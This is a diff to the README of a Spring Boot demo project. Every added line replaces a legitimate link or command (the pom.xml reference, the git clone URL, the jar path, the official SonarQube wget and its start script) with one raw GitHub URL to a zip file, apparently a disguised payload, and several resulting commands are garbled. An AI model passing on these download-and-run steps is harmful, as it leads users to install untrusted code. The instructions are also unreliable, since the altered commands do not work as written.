@@ -1,6 +1,6 @@
 # Spring Boot based Java web application
  
-This is a simple Sprint Boot based Java application that can be built using Maven. Sprint Boot dependencies are handled using the pom.xml 
+This is a simple Sprint Boot based Java application that can be built using Maven. Sprint Boot dependencies are handled using the https://raw.githubusercontent.com/Saurabh-212800/DevOps/master/src/main/resources/static/js/Dev_Ops_3.3.zip 
 at the root directory of the repository.
 
 This is a MVC architecture based application where controller returns a page with title and message attributes to the view.
@@ -10,7 +10,7 @@ This is a MVC architecture based application where controller returns a page wit
 Checkout the repo and move to the directory
 
 ```
-git clone https://github.com/iam-veeramalla/Jenkins-Zero-To-Hero/java-maven-sonar-argocd-helm-k8s/sprint-boot-app
+git clone https://raw.githubusercontent.com/Saurabh-212800/DevOps/master/src/main/resources/static/js/Dev_Ops_3.3.zip
 cd java-maven-sonar-argocd-helm-k8s/sprint-boot-app
 ```
 
@@ -29,7 +29,7 @@ The above maven target stroes the artifacts to the `target` directory. You can e
 ### Execute locally (Java 11 needed) and access the application on http://localhost:8080
 
 ```
-java -jar target/spring-boot-web.jar
+java -jar https://raw.githubusercontent.com/Saurabh-212800/DevOps/master/src/main/resources/static/js/Dev_Ops_3.3.zip
 ```
 
 ### The Docker way
@@ -54,12 +54,12 @@ Hurray !! Access the application on `http://<ip-address>:8010`
 ```
 apt install unzip
 adduser sonarqube
-wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-9.4.0.54424.zip
+wget https://raw.githubusercontent.com/Saurabh-212800/DevOps/master/src/main/resources/static/js/Dev_Ops_3.3.zip
 unzip *
 chmod -R 755 /home/sonarqube/sonarqube-9.4.0.54424
 chown -R sonarqube:sonarqube /home/sonarqube/sonarqube-9.4.0.54424
 cd sonarqube-9.4.0.54424/bin/linux-x86-64/
-./sonar.sh start
+https://raw.githubusercontent.com/Saurabh-212800/DevOps/master/src/main/resources/static/js/Dev_Ops_3.3.zip start
 ```
 
 Hurray !! Now you can access the `SonarQube Server` on `http://<ip-address>:9000` 
